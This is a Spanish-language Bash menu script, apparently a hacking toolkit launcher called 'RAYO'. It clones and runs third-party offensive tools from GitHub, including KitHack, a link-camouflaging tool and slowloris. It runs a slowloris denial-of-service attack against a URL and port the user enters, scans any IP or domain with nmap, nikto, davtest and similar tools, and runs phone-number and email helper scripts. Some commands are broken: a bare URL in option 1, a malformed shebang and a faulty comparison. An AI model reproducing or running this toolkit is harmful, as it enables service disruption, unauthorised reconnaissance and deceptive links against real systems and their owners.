#!bin/bash


blanco="\033[1;37m"
moradofuerte="\033[0;35m"
rojo="\033[1;31m"
amarillo="\033[1;33m"
morado="\033[0;35m"
cyan="\033[0;36m"
azul="\033[1;34m"

clear

echo -e $cyan"                                        "
echo ":::::::::      :::   :::   :::  ::::::::   "    
echo ":+:    :+:   :+: :+: :+:   :+: :+:    :+:  "    
echo "+:+    +:+  +:+   +:+ +:+ +:+  +:+    +:+  "    
echo "+#++:++#:  +#++:++#++: +#++:   +#+    +:+  "    
echo "+#+    +#+ +#+     +#+  +#+    +#+    +#+  "    
echo "#+#    #+# #+#     #+#  #+#    #+#    #+#  "   
echo "###    ### ###     ###  ###     ########   "
echo -e $azul"                                   "
echo "      creado por ...xyks/ale.tryhard       "
echo
echo -e $amarillo"                            "
echo "1) kithack"
echo "2) Scaner de ip o dominio"
echo "3) Camuflar link"
echo "4) Mini kit de herramientas"
echo "5) Mini extraccion de informacion de un numero de telefono"
echo "6) Ataque DoS "
echo "7) Mandar mensajes a un correo electronico desde la consola"
echo "8) Extraer la ip de un sitio web"
echo -e $cyan"                      "
read -p "[+] Rayo > " opcion
echo 
echo

if [ $opcion = 1 ]; then
	cd tools
	https://github.com/AdrMXR/KitHack
	cd KitHack
	bash install.sh
	kithack
fi

if [ $opcion = 2 ]; then
	echo -e $cyan"                   "
	echo "██╗███╗   ██╗███████╗████████╗ █████╗ ██╗      █████╗ ██████╗  ██████╗ ██████╗ "
	echo "██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗ "
	echo "██║██╔██╗ ██║███████╗   ██║   ███████║██║     ███████║██║  ██║██║   ██║██████╔╝ "
	echo "██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██╔══██║██║  ██║██║   ██║██╔══██╗ "
	echo "██║██║ ╚████║███████║   ██║   ██║  ██║███████╗██║  ██║██████╔╝╚██████╔╝██║  ██║ " 
	echo "╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝ "
	echo
	sudo apt-get install sslscan -y
	sudo apt-get install nmap -y 
	sudo apt-get install dmitry -y 
	sudo apt-get install nikto -y
	sudo apt-get install whatweb -y  
	sudo apt-get install figlet toilet -y  
	sudo apt-get install figlet -y
	sudo apt-get install unicornscan -y
	sudo apt-get install fierce -y  
	sudo apt-get install davtest -y
	sudo apt-get install dnsmap -y 
	sudo apt-get install openssl -y
	clear
	echo -e $amarillo"                                    "
	echo " d8888    o88b   .d8b.  d8b   db d88888b d8888b. " 
	echo "88   YP d8P  Y8 d8'  8b 888o  88 88      88   8D "
	echo " 8bo    8P      88ooo88 88V8o 88 88ooooo 88oobY  "
 	echo "   Y8b  8b      88   88 88 V8 88 88      88 8b   "
	echo "db   8D Y8b  d8 88   88 88  V888 88      88  88  "
	echo " 8888Y    Y88P  YP   YP VP   V8P Y88888P 88   YD "
	echo -e $cyan"                                          "
	read -p "dominio o ip: " ipe
	echo -e $rojo
	figlet sslscan
	echo -e $amarillo
	sslscan $ipe
	echo -e $rojo
	figlet nmap
	echo -e $amarillo
	nmap $ipe
	echo -e $rojo
	figlet whatweb
	whatweb $ipe
	echo -e $rojo
	figlet davtest
	echo -e $amarillo
	davtest -url $ipe
	echo -e $rojo
	figlet fierce
	echo -e $amarillo
	fierce --domain $ipe
	echo -e $rojo
	figlet unicornscan
	echo -e $amarillo
	unicornscan $ipe
	echo -e $rojo
	figlet dmitry
	echo -e $amarillo
	dmitry -winspef -o pagina.txt $ipe
	echo -e $rojo
	figlet nikto
	echo -e $amarillo
	nikto -h $ipe
	echo -e $rojo
	figlet dnsmap
	echo -e $amarillo
	dnsmap $ipe
fi

if [ $opcion = 3 ]; then
	cd tools
	git clone https://github.com/ale-ninja-hack/CamuflaLink
	cd CamuflaLink
	bash camu-link.sh
fi

if [ $opcion = 4 ]; then
	cd tools
	git clone https://github.com/ale-ninja-hack/NinjaHack
	cd NinjaHack
	python3 ninja.py
fi

if [ $opcion = 5 ]; then
	cd tools
	python3 num-info.py
fi

if [ $opcion = 6 ]; then
	git clone https://github.com/gkbrk/slowloris.git
	cd slowloris
	clear
	echo -e $cyan"                                          "
	echo " /$$$$$$$             /$$$$$$   "
	echo "| $$__  $$           /$$__  $$  "
	echo "| $$  \ $$  /$$$$$$ | $$  \__/  "
	echo "| $$  | $$ /$$__  $$|  $$$$$$   "
	echo "| $$  | $$| $$  \ $$ \____  $$  "
	echo "| $$  | $$| $$  | $$ /$$  \ $$  "
	echo "| $$$$$$$/|  $$$$$$/|  $$$$$$/  "
	echo "|_______/  \______/  \______/   "
	echo -e $amarillo"                                          "
	read -p "URL o dominio > " web
	read -p "Puerto a atacar > " puerto
	read -p "Sockets/enchufes > " enchufes
	python3 slowloris.py $web -p $puerto -s $enchufes
fi

if [ $opcion = 7 ]; then
	cd tools
	pip install smtp
	python3 correo.py
fi

if [ $opcion =8 ]; then
	cd tools
	python3 ip-de-sitio.py
fi

